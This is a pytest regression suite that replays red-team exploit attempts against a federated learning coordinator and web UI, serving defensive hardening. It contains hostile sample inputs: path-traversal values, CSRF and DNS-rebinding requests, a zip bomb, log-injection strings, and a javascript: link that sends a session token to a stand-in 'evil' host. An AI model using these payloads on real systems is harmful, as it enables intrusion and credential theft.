"""Red-team regression suite (v2.3). Each test is one hardening item from the v2.3 security review, written as an exploit
attempt that must FAIL against the hardened code. Against v2.2 every one of these tests failed, which is how the
findings were confirmed. Nothing here needs torch or a network: gRPC handlers are driven in-process with a fake
context that presents a real X.509 certificate, exactly what the gRPC auth context hands the gate.
"""
import json
import os
import stat
import zipfile

import pytest

pytest.importorskip("grpc")
import grpc  # noqa: E402

from vfl import security as sec  # noqa: E402
from vfl.proto import vfl_pb2 as pb  # noqa: E402

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))


class Aborted(Exception):
    def __init__(self, code, details):
        super().__init__(f"{code}: {details}")
        self.code, self.details = code, details


class Ctx:
    """What a gRPC server context exposes to the gate: the peer address and the peer's certificate."""

    def __init__(self, cert_pem: bytes | None = None, peer="ipv4:10.0.0.66:4242"):
        self.pem, self._peer = cert_pem, peer

    def peer(self):
        return self._peer

    def auth_context(self):
        return {"x509_pem_cert": [self.pem]} if self.pem else {}

    def abort(self, code, details):
        raise Aborted(code, details)


@pytest.fixture
def static_certs(tmp_path):
    d = str(tmp_path / "certs")
    sec.generate_all(d, ["coordinator", "active", "passive-1", "passive-2"])
    return d


def _pem(d, node):
    return open(os.path.join(d, f"{node}.crt"), "rb").read()


def _legacy_static_cert(d, node):
    """A v2.2-style static certificate: CN only, no role in the SAN (what existing deployments hold)."""
    from cryptography import x509
    from cryptography.hazmat.primitives import hashes
    from cryptography.x509.oid import NameOID
    import datetime as dt
    ca_key, ca = sec.load_ca(d)
    key = sec._key()
    now = dt.datetime.now(dt.timezone.utc)
    cert = (x509.CertificateBuilder().subject_name(x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, node)]))
            .issuer_name(ca.subject).public_key(key.public_key()).serial_number(x509.random_serial_number())
            .not_valid_before(now - dt.timedelta(minutes=1)).not_valid_after(now + dt.timedelta(days=1))
            .add_extension(x509.SubjectAlternativeName([x509.DNSName(node)]), critical=False)
            .sign(ca_key, hashes.SHA256()))
    return sec._pem(cert)


def _coordinator(tmp_path, tls_dir=None):
    from vfl.config import load_session_config
    from vfl.coordinator import CoordinatorServicer, CoordinatorState
    st = CoordinatorState(str(tmp_path / "runs"), load_session_config(None), sec.TLSFiles(tls_dir, "coordinator"))
    return st, CoordinatorServicer(st)


def _gate_call(gate, method, request, ctx, inner):
    """Run `inner` behind the SecurityGate exactly as grpc would."""
    class HCD:
        pass
    h = HCD()
    h.method = f"/vfl.Coordinator/{method}"

    class Handler:
        unary_unary = staticmethod(inner)
        request_deserializer = response_serializer = None
    wrapped = gate.intercept_service(lambda _: Handler(), h)
    return wrapped.unary_unary(request, ctx)


# ---------------------------------------------------------------------------------------------- RT-01 (critical)
def test_rt01_passive_certificate_cannot_register_as_the_active_party(tmp_path, static_certs):
    """v2.2: static certificates carry no role, so the gate and Register skipped the role check. passive-1 could
    register as role=active with an attacker address; every other passive then dialled passive-1 (pinning its
    party id, which its own certificate satisfies) and streamed it their representations."""
    from vfl.transport import COORDINATOR_POLICY, SecurityGate
    st, svc = _coordinator(tmp_path, static_certs)
    gate = SecurityGate(sec.TLSFiles(static_certs, "coordinator"), COORDINATOR_POLICY)
    req = pb.RegisterRequest(party_id="passive-1", role="active", address="10.0.0.66:50051")
    for pem in (_pem(static_certs, "passive-1"), _legacy_static_cert(static_certs, "passive-1")):
        with pytest.raises(Aborted) as e:
            _gate_call(gate, "Register", req, Ctx(pem), svc.Register)
        assert e.value.code == grpc.StatusCode.PERMISSION_DENIED
    assert "passive-1" not in st.parties
    # the coordinator's own certificate may not join as a party either
    with pytest.raises(Aborted):
        _gate_call(gate, "Register", pb.RegisterRequest(party_id="coordinator", role="passive"),
                   Ctx(_pem(static_certs, "coordinator")), svc.Register)
    # the genuine active party still registers
    rep = _gate_call(gate, "Register", pb.RegisterRequest(party_id="active", role="active", address="h:1"),
                     Ctx(_pem(static_certs, "active")), svc.Register)
    assert rep.ok


def test_rt01_static_certs_carry_their_role(static_certs):
    assert sec.describe_cert(_pem(static_certs, "active"))["role"] == "active"
    assert sec.describe_cert(_pem(static_certs, "passive-2"))["role"] == "passive"
    assert sec.describe_cert(_pem(static_certs, "coordinator"))["role"] == "coordinator"


# ---------------------------------------------------------------------------------------------- RT-02 (critical)
@pytest.mark.parametrize("bad", ["/tmp/evil", "../../uploads/evil", "..", "a/b", "s1\n", ""])
def test_rt02_resume_from_cannot_point_outside_the_run_dir(bad):
    """v2.2: resume_from was any string. An absolute path made every party torch.load() an attacker file with
    weights_only=False (pickle = code execution) and the coordinator read config/summary from it."""
    from vfl.config import load_session_config, validate_session_config
    cfg = load_session_config(None)
    cfg["resume_from"] = bad
    with pytest.raises(ValueError):
        validate_session_config(cfg)


def test_rt02_checkpoints_are_loaded_without_pickle():
    src = open(os.path.join(ROOT, "vfl", "core.py")).read()
    assert "weights_only=False" not in src and "weights_only=True" in src


def test_rt02_parties_refuse_unsafe_session_ids():
    from vfl.ids import check_session_id
    for bad in ("/etc", "../x", "a/b", "", "x" * 200):
        with pytest.raises(ValueError):
            check_session_id(bad)
    assert check_session_id("s20261103-115000-ab12") == "s20261103-115000-ab12"


# ---------------------------------------------------------------------------------------------- RT-03 (critical)
class _FakeCoord:
    lab_mode = False
    registry = None
    default_config = {}
    id = "coord-x"

    def __init__(self):
        self.started = []

    def start_session(self, body):
        self.started.append(body)
        return {"ok": True}

    def ui_state(self):
        return {"role": "coordinator", "parties": [], "sessions": []}


def test_rt03_coordinator_dashboard_rejects_cross_site_and_rebinding_requests():
    """v2.2: with no --ui-token (the default) every request was 'operator', and get_json(force=True) parsed a
    text/plain body, so any web page the operator visited could start/stop sessions, mint join tokens, approve
    joins and launch lab attacks (CSRF). With DNS rebinding it could also read the replies (tokens)."""
    from vfl.dashboard import create_app
    be = _FakeCoord()
    c = create_app(be, "coordinator").test_client()
    # classic form-style CSRF: text/plain body, no custom header
    r = c.post("/api/sessions", data='{"config":{"epochs":1}}', content_type="text/plain",
               headers={"Origin": "https://evil.example"})
    assert r.status_code == 403 and not be.started
    # DNS rebinding: attacker domain resolving to 127.0.0.1
    r = c.get("/api/state", headers={"Host": "evil.example:8080"})
    assert r.status_code == 403
    # the real UI (same origin, JSON + header) still works
    r = c.post("/api/sessions", json={"config": {"epochs": 1}}, headers={"X-VFL-Request": "1"})
    assert r.status_code == 200 and be.started
    # and so does the CLI client (JSON content type, no Origin)
    r = c.post("/api/sessions", data="{}", content_type="application/json")
    assert r.status_code == 200


def test_rt03_unified_ui_rejects_cross_site_uploads_and_actions(tmp_path):
    from vfl.webui import create_app
    app = create_app(str(tmp_path / "ws"))              # no token: loopback default
    try:
        c = app.test_client()
        import io
        r = c.post("/api/uploads", data={"file": (io.BytesIO(b"id,x\n1,2\n"), "evil.csv")},
                   content_type="multipart/form-data", headers={"Origin": "https://evil.example"})
        assert r.status_code == 403
        assert not os.path.exists(tmp_path / "ws" / "uploads" / "evil.csv")
        r = c.post("/api/admin/ui-user", data='{"name":"mallory","password":"password123","role":"operator"}',
                   content_type="text/plain")
        assert r.status_code == 403
        assert c.get("/api/whoami", headers={"Host": "attacker.test"}).status_code == 403
        r = c.post("/api/uploads", data={"file": (io.BytesIO(b"id,x\n1,2\n"), "ok.csv")},
                   content_type="multipart/form-data", headers={"X-VFL-Request": "1"})
        assert r.status_code == 200
    finally:
        app.extensions["vfl"]["deploys"].stop_all()


def test_rt03_security_headers():
    from vfl.dashboard import create_app
    r = create_app(_FakeCoord(), "coordinator").test_client().get("/healthz")
    assert "script-src 'self'" in r.headers.get("Content-Security-Policy", "")
    assert r.headers.get("X-Frame-Options") == "DENY" and r.headers.get("X-Content-Type-Options") == "nosniff"
    assert r.headers.get("Referrer-Policy") == "no-referrer"


# ---------------------------------------------------------------------------------------------- RT-04 (high)
def test_rt04_party_controlled_links_cannot_run_script(tmp_path):
    """v2.2: Register.ui_url was stored as-is and rendered as <a href=...> in the coordinator dashboard and the
    unified UI. A party registering ui_url='javascript:...' got script execution in the operator's browser
    (token in sessionStorage -> every operator action)."""
    st, _ = _coordinator(tmp_path)
    ok, err = st.register(pb.RegisterRequest(party_id="passive-1", role="passive",
                                             ui_url="javascript:fetch('//evil/'+sessionStorage['vfl-token'])"))
    assert not ok and "ui_url" in err
    for js in ("vfl/dashboard/static/app.js", "vfl/webui/static/app.js"):
        src = open(os.path.join(ROOT, js)).read()
        assert "safeUrl" in src and 'href="${esc(p.ui_url)}"' not in src, js


# ---------------------------------------------------------------------------------------------- RT-05 (high)
def _reg(tmp_path, mode="token"):
    from vfl.enrollment import IdentityRegistry
    d = str(tmp_path / "pki")
    sec.make_pki(d)
    return IdentityRegistry(d, str(tmp_path / "state"), mode)


def _enroll(reg, name, token, role="passive", csr=None):
    if csr is None:
        _, csr = sec.make_csr(name)
    return reg.enroll(pb.EnrollRequest(party_id=name, role=role, csr_pem=csr, token=token), Ctx())


def test_rt05_unnamed_token_cannot_mint_a_coordinator_or_existing_identity(tmp_path):
    """v2.2: an unnamed passive token could enroll the name 'coordinator' (DNS SAN coordinator.vfl.<domain> = what
    every party pins for the coordinator, with SERVER_AUTH) or re-enroll an existing party's name."""
    reg = _reg(tmp_path)
    for name in ("coordinator", "rogue-node"):
        rep = _enroll(reg, name, reg.create_token("passive")["token"])
        assert rep.status != "issued", name
    assert _enroll(reg, "passive-1", reg.create_token("passive")["token"]).status == "issued"
    rep = _enroll(reg, "passive-1", reg.create_token("passive")["token"])      # identity squatting
    assert rep.status != "issued" and "already" in rep.error


def test_rt05_server_names_are_role_qualified(tmp_path):
    reg = _reg(tmp_path)
    rep = _enroll(reg, "active", reg.create_token("passive")["token"])           # a PASSIVE named 'active'
    assert rep.status == "issued"
    from cryptography import x509
    dns = x509.load_pem_x509_certificate(rep.cert_pem).extensions.get_extension_for_class(
        x509.SubjectAlternativeName).value.get_values_for_type(x509.DNSName)
    pinned = sec.TLSFiles(str(tmp_path / "pki"), "passive-1").server_name("active")   # what a passive dials
    assert pinned not in dns                                                     # cannot serve as the active party


# ---------------------------------------------------------------------------------------------- RT-06 (high)
def test_rt06_revoking_an_identity_also_kills_its_renewed_certificates(tmp_path):
    """v2.2: revocation was by serial only. A party that had already renewed (every 16 h by default) kept a valid,
    non-revoked certificate, and could keep renewing it forever."""
    reg = _reg(tmp_path)
    key_a, csr = sec.make_csr("passive-1")
    rep_a = _enroll(reg, "passive-1", reg.create_token("passive")["token"], csr=csr)
    key_b, csr_b = sec.make_csr("passive-1")
    rep_b = reg.renew(pb.RenewRequest(cert_pem=rep_a.cert_pem, csr_pem=csr_b,
                                      signature=sec.sign_bytes(key_a, csr_b)), Ctx())
    assert rep_b.status == "issued"
    reg.revoke(sec.describe_cert(rep_a.cert_pem)["serial"], "stolen key")
    assert sec.describe_cert(rep_b.cert_pem)["serial"] in reg.revoked
    _, csr_c = sec.make_csr("passive-1")
    rep_c = reg.renew(pb.RenewRequest(cert_pem=rep_b.cert_pem, csr_pem=csr_c,
                                      signature=sec.sign_bytes(key_b, csr_c)), Ctx())
    assert rep_c.status == "denied"


# ---------------------------------------------------------------------------------------------- RT-07 (high)
def test_rt07_passive_cannot_forge_session_metrics_or_security_evidence(tmp_path):
    """v2.2: a passive's 'epoch' report with val/test/leakage keys was appended to the session's epoch_metrics, so
    the run summary, inference panel and report showed the attacker's AUROC / attack AUC. A 'security' report
    could also inject any record, e.g. evidence='server-observed', outcome='blocked'."""
    from vfl.telemetry import SECURITY
    st, _ = _coordinator(tmp_path)
    st.register(pb.RegisterRequest(party_id="active", role="active", address="h:1"))
    st.register(pb.RegisterRequest(party_id="passive-1", role="passive"))
    st.parties["active"]["status"] = st.parties["passive-1"]["status"] = "idle"
    import vfl.coordinator as C
    C.check_data_consistency = lambda cfg, parties: None                       # torch-free test
    sid = st.start_session({"config": {"epochs": 2}})["session_id"]
    forged = {"epoch": 0, "test": {"auroc": 0.999}, "val": {"auroc": 0.999}, "leakage": {"norm_leak_auc": 0.5}}
    st.report(pb.ReportRequest(session_id=sid, party_id="passive-1", kind="epoch", payload_json=json.dumps(forged)))
    assert st.sessions[sid].epoch_metrics == []
    n0 = len(SECURITY.recent(10000))
    ev = {"attack_type": "label_leakage", "outcome": "blocked", "evidence": "server-observed", "node": "active",
          "detail": "x" * 10000}
    st.report(pb.ReportRequest(party_id="passive-1", kind="security", payload_json=json.dumps({"events": [ev]})))
    rec = SECURITY.recent(10000)[n0:][-1]
    assert rec["evidence"] == "party-reported" and rec["node"] == "passive-1" and len(rec["detail"]) <= 500
    st.report(pb.ReportRequest(party_id="passive-1", kind="security",
                               payload_json=json.dumps({"events": [{"attack_type": ["unhashable"]}]})))  # no crash


# ---------------------------------------------------------------------------------------------- RT-08 (high)
def test_rt08_slot_window_rejects_future_and_negative_batches():
    """v2.2: the active party created a slot for ANY (epoch, batch) a passive named, including negative indices
    (Python wraps them) and future epochs. 64 such messages evicted the live slot (the session then failed with
    'too old') and each one parked a server thread for slot_timeout_s."""
    from vfl.limits import check_slot
    check_slot("train", 3, 5, n_batches=10, current_epoch=3)
    for e, b in ((3, -1), (3, 10), (9, 0), (1, 0), (-1, 0)):
        with pytest.raises(ValueError):
            check_slot("train", e, b, n_batches=10, current_epoch=3)
    with pytest.raises(ValueError):
        check_slot("eval", 3, -2, n_batches=4, current_epoch=3)
    with pytest.raises(ValueError):                                          # racing far ahead of the schedule
        check_slot("train", 3, 9, n_batches=10, current_epoch=3, committed=2)
    check_slot("train", 3, 3, n_batches=10, current_epoch=3, committed=2)


def test_rt08_psi_inputs_are_bounded():
    from vfl.alignment import MultiPSIHub, PSIProtocolError
    from vfl.limits import psi_item_cap
    assert psi_item_cap(1000) < 10 ** 6
    src = open(os.path.join(ROOT, "vfl", "active.py")).read()
    assert "psi_item_cap" in src and "round 1 was already" in src            # two-party: one round 1, bounded
    hub = MultiPSIHub([f"id{i}" for i in range(30)], "active", ["passive-1", "passive-2"])
    from vfl.alignment import hash_to_group, to_bytes
    big = [to_bytes(hash_to_group(f"x{i}")) for i in range(psi_item_cap(30) + 1)]
    with pytest.raises(PSIProtocolError):
        hub.submit("passive-1", big)


# ---------------------------------------------------------------------------------------------- RT-09 (high)
def test_rt09_no_test_identity_in_production_cert_sets(tmp_path):
    """v2.2: every certificate set made by the UI or the harness contained 'rogue-node', a CA-signed identity the
    coordinator accepted as a passive party (role_of_node -> passive). Anyone with that file could join."""
    from vfl.webui.dataprep import certs_argv
    assert "rogue-node" not in certs_argv("prod", 2)
    src = open(os.path.join(ROOT, "vfl", "webui", "__init__.py")).read()
    assert 'extra=["rogue-node"]' not in src
    st, _ = _coordinator(tmp_path)
    ok, err = st.register(pb.RegisterRequest(party_id="rogue-node", role="passive"))
    assert not ok and "lab" in err


# ---------------------------------------------------------------------------------------------- RT-10 (medium)
def test_rt10_party_hostnames_do_not_widen_the_lab_attack_allowlist(tmp_path):
    from vfl.attacks.lab import LabRunner
    st, _ = _coordinator(tmp_path)
    st.register(pb.RegisterRequest(party_id="active", role="active", address="127.0.0.1:50051",
                                   hostname="victim.example.org"))
    st.register(pb.RegisterRequest(party_id="passive-1", role="passive", hostname="203.0.113.9"))
    lab = LabRunner(st, str(tmp_path), "0.0.0.0:50050", 8080, "tok", False)
    hosts = json.load(open(lab.targets()))["hosts"]
    assert "victim.example.org" not in hosts and "203.0.113.9" not in hosts
    st.register(pb.RegisterRequest(party_id="active", role="active", address="93.184.216.34:443"))
    with pytest.raises(ValueError):
        lab.launch("all", {})


# ---------------------------------------------------------------------------------------------- RT-11 (medium)
def test_rt11_tokens_never_on_command_lines(tmp_path):
    import sys
    sys.path.insert(0, ROOT)
    from bench.harness import LocalDeployment
    dep = LocalDeployment(str(tmp_path / "d"), str(tmp_path), 1, ui_token="s3cret")
    assert all("s3cret" not in " ".join(n["args"]) for n in dep.plan())
    assert dep.env.get("VFL_UI_TOKEN") == "s3cret"


def test_rt11_bundles_are_private_files(tmp_path):
    from vfl.webui.deploy import DeploymentManager
    from vfl.webui.dataprep import Workspace
    from vfl.data import prepare_vertical_dataset
    ws = Workspace(str(tmp_path / "ws"))
    prepare_vertical_dataset(ws.path("datasets", "d"), "breast_cancer", n_passive=1, overlap=0.9, seed=0)
    sec.generate_all(ws.path("certs", "c"), ["coordinator", "active", "passive-1"])
    dm = DeploymentManager(ws)
    out = dm.make_bundles("lan", "d", "c", 1, "10.0.0.1", "10.0.0.2", ["10.0.0.3"])
    for n in out["machines"]:
        p = os.path.join(ws.root, n["bundle"])
        assert stat.S_IMODE(os.stat(p).st_mode) == 0o600
        with zipfile.ZipFile(p) as z:
            run = z.read(f"run-{n['name']}.sh").decode()
            assert out["ui_token"] not in run.split("\n")[-2] or "VFL_UI_TOKEN" in run
    with pytest.raises(ValueError):
        dm.make_bundles("lan2", "d", "c", 1, "10.0.0.1", "10.0.0.2", ["10.0.0.3"], tls="insecure")


# ---------------------------------------------------------------------------------------------- RT-12 (medium)
def test_rt12_enrollment_requests_are_validated_and_bounded(tmp_path):
    reg = _reg(tmp_path, "approval")
    rep = _enroll(reg, "passive-7", "", csr=b"\xff\xfe not a csr")
    assert rep.status == "error"
    _, other = sec.make_csr("someone-else")
    assert _enroll(reg, "passive-7", "", csr=other).status == "error"           # CN must match
    for i in range(200):
        _enroll(reg, f"p{i}", "")
    assert sum(r["status"] == "pending" for r in reg.requests.values()) <= 50
    reg2 = _reg(tmp_path / "t")
    tok = reg2.create_token("passive")["token"]
    assert _enroll(reg2, "passive-3", tok, csr=b"garbage").status == "error"
    assert _enroll(reg2, "passive-3", tok).status == "issued"                    # a bad CSR does not burn the token
    with pytest.raises(ValueError):
        reg2.create_token("passive", ttl_s=10 ** 9)


# ---------------------------------------------------------------------------------------------- RT-13 (medium)
def test_rt13_root_ca_is_never_trusted_unpinned(tmp_path):
    from vfl.enrollment import fetch_root
    with pytest.raises(ValueError, match="pin"):
        fetch_root("http://10.0.0.1:8080", None, None)


# ---------------------------------------------------------------------------------------------- RT-14 (medium)
def test_rt14_hostile_tensors_are_rejected_cleanly():
    from vfl import codec
    import numpy as np
    bad = [pb.Tensor(shape=[2 ** 31, 2 ** 31, 2 ** 31, 2 ** 31], dtype="float32", data=b""),
           pb.Tensor(shape=[1, 10 ** 12], dtype="topk", data=np.array([1], "<u4").tobytes() + b"\0" * 4),
           pb.Tensor(shape=[3, 4], dtype="float32", data=b"\0" * 7)]
    for t in bad:
        with pytest.raises(codec.TensorRejected):
            codec.decode(t, expected_shape=(4, 16))


# ---------------------------------------------------------------------------------------------- RT-15 (medium)
def test_rt15_party_strings_are_bounded_and_single_line(tmp_path):
    st, _ = _coordinator(tmp_path)
    ok, _ = st.register(pb.RegisterRequest(party_id="passive-1", role="passive", hostname="h\nFAKE LOG LINE",
                                           summary_json=json.dumps({"x": "y" * (2 * 2 ** 20)})))
    assert not ok
    ok, _ = st.register(pb.RegisterRequest(party_id="passive-1", role="passive", hostname="h\nFAKE"))
    assert ok and "\n" not in st.parties["passive-1"]["hostname"]
    from vfl.telemetry import SECURITY
    rec = SECURITY.event("x", "auth", "blocked", detail="a\nb\rc", claimed="p\n1")
    assert "\n" not in rec["detail"] and "\n" not in rec["claimed_identity"]


# ---------------------------------------------------------------------------------------------- RT-16 (medium)
def test_rt16_deploy_names_cannot_traverse(tmp_path):
    from vfl.webui.deploy import DeploymentManager
    from vfl.webui.dataprep import Workspace, safe_extract
    ws = Workspace(str(tmp_path / "ws"))
    dm = DeploymentManager(ws)
    with pytest.raises(ValueError):
        dm.launch_local("x", "../../etc", 1)
    with pytest.raises(ValueError):
        dm.make_bundles("x", "d", "../../root/.ssh", 1, "a", "b", ["c"])
    z = tmp_path / "bomb.zip"
    with zipfile.ZipFile(z, "w", zipfile.ZIP_DEFLATED) as f:
        f.writestr("big.bin", b"\0" * (64 * 2 ** 20))
    with pytest.raises(ValueError):
        safe_extract(str(z), str(tmp_path / "out"), max_bytes=16 * 2 ** 20)


# ---------------------------------------------------------------------------------------------- RT-17 (medium)
def test_rt17_empty_claim_does_not_skip_identity_binding(tmp_path, static_certs):
    from vfl.transport import COORDINATOR_POLICY, SecurityGate
    st, svc = _coordinator(tmp_path, static_certs)
    gate = SecurityGate(sec.TLSFiles(static_certs, "coordinator"), COORDINATOR_POLICY)
    with pytest.raises(Aborted):
        _gate_call(gate, "Report", pb.ReportRequest(party_id="", kind="security", payload_json="{}"),
                   Ctx(_pem(static_certs, "passive-1")), svc.Report)


def test_rt17_per_identity_concurrency_cap_is_on_by_default():
    from vfl.cli import build_parser
    a = build_parser().parse_args(["coordinator"])
    assert a.max_peer_concurrency and a.max_peer_concurrency <= 32


# ---------------------------------------------------------------------------------------------- RT-18 (low)
def test_rt18_token_compare_is_constant_time_and_header_only_for_actions():
    assert "compare_digest" in open(os.path.join(ROOT, "vfl", "websec.py")).read()
    for f in ("vfl/dashboard/__init__.py", "vfl/webui/__init__.py", "bench/ui.py"):
        src = open(os.path.join(ROOT, f)).read()
        assert "websec.bearer_ok(token)" in src and '== f"Bearer {token}"' not in src, f
    from vfl.dashboard import create_app
    be = _FakeCoord()
    c = create_app(be, "coordinator", token="tok").test_client()
    r = c.post("/api/sessions?token=tok", json={}, headers={"X-VFL-Request": "1"})
    assert r.status_code == 401                                                # tokens in URLs leak via logs
    r = c.post("/api/sessions", json={}, headers={"X-VFL-Request": "1", "Authorization": "Bearer tok"})
    assert r.status_code == 200


def test_rt18_login_is_throttled(tmp_path):
    from vfl.dashboard import add_user, create_app
    users = str(tmp_path / "u.json")
    add_user(users, "op", "correct-horse", "operator")
    c = create_app(_FakeCoord(), "coordinator", users=users).test_client()
    o = {"Origin": "http://localhost"}                                       # a same-origin browser form
    codes = [c.post("/login", data={"user": "op", "password": f"guess{i}"}, headers=o).status_code for i in range(12)]
    assert 429 in codes
    assert c.post("/login", data={"user": "op", "password": "correct-horse"}, headers=o).status_code == 429  # locked


# ---------------------------------------------------------------------------------------------- RT-20 (low)
def test_rt20_insecure_mode_refuses_non_loopback_listen():
    from vfl.cli import _tls, build_parser
    a = build_parser().parse_args(["coordinator", "--insecure", "--listen", "0.0.0.0:50050"])
    with pytest.raises(SystemExit):
        _tls(a)
    a = build_parser().parse_args(["coordinator", "--insecure", "--listen", "127.0.0.1:50050"])
    assert _tls(a) is None
